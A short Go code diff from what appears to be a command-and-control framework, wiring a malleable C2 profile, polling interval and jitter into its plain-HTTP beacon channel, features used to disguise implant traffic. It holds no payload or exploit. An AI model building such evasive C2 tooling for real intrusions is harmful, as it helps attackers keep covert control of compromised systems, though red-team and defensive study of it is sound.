@@ -28,6 +28,13 @@ func EstablishC2Connection(url string, streamID string, capabilities ...string) 
 		cancel()
 		return nil, nil, nil, fmt.Errorf("unsupported c2 channel mode %q (available: %s)", mode, available)
 	}
+	if mode == "plain_http" {
+		if w, ok := channelWrapper.(*transport.HTTPChannelWrapper); ok {
+			w.Config = &common.RuntimeConfig.MalleableC2
+			w.PollInterval = common.RuntimeConfig.PollInterval
+			w.Jitter = common.RuntimeConfig.Jitter
+		}
+	}
 	logging.Infof("EstablishC2Connection: connecting to %s with mode=%s", url, mode)
 
 	conn, err = establishChannelStream(ctx, url, channelWrapper)
